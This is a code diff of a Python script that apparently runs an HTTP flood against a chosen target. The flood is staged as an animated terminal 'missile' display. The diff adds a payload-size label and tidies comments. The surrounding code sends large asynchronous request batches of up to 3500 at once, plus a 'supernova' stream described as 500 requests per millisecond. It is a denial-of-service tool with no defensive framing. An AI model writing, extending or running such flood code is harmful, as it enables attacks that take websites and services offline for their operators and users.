@@ -38,19 +38,22 @@ EXHAUST_FRAMES = [
     "\033[93m ::: \033[0m"
 ]
 
-# Missile types: speed -> request batch
+# Payload
+PAYLOAD_KB = 254 * 5  # 1270 KB
+PAYLOAD_MB = PAYLOAD_KB / 1024  # ~1.24 MB
+PAYLOAD_DISPLAY = f"{PAYLOAD_KB} KB | {PAYLOAD_MB:.2f} MB"
+
+# Missile batches
 MISSILE_BATCHES = {
     1: 50,
     2: 200,
     3: 300,
     4: 1000
 }
-
 ULTRA_SUPER_BATCH = 3500
 LAST_BATCH = 500
-
 SUPERNOVA_INITIAL = 1000
-SUPERNOVA_STREAM = 50 * 10  # 50/ms × 10 = 500/ms
+SUPERNOVA_STREAM = 50 * 10  # 500/ms
 
 class Missile:
     def __init__(self, speed=None):
@@ -75,7 +78,7 @@ class Missile:
                 self.reset()
                 self.active = False
 
-# Draw missiles with only number of requests
+# Draw missiles with batch and payload
 def draw_missiles(missiles):
     buffer = [""] * TERMINAL_HEIGHT
     for missile in missiles:
@@ -84,7 +87,7 @@ def draw_missiles(missiles):
                 pos = missile.y - len(MISSILE_BODY) + i
                 if 0 <= pos < TERMINAL_HEIGHT:
                     if i == 0:
-                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
+                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}] | Data: {PAYLOAD_DISPLAY}"
                     else:
                         buffer[pos] += " " * missile.x + line
             exhaust_pos = missile.y
@@ -93,7 +96,7 @@ def draw_missiles(missiles):
     clear()
     print("\n".join(buffer))
 
-# Send batch requests
+# Send requests
 async def send_requests(target, batch):
     async with aiohttp.ClientSession() as session:
         tasks = []
@@ -118,17 +121,15 @@ async def last_missile(target, duration):
         asyncio.create_task(send_requests(target, LAST_BATCH))
         await asyncio.sleep(0.5)
 
-# Supernova missile
+# Supernova missile every 5-10s
 async def supernova_missile(target, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
         delay = random.uniform(5, 10)
         await asyncio.sleep(delay)
-
-        # Initial 1000 requests
         asyncio.create_task(send_requests(target, SUPERNOVA_INITIAL))
 
-        # Stream of 500/ms while rising (~2s flight)
+        # stream while rising
         async def stream():
             t_end = time.time() + 2
             while time.time() < t_end:
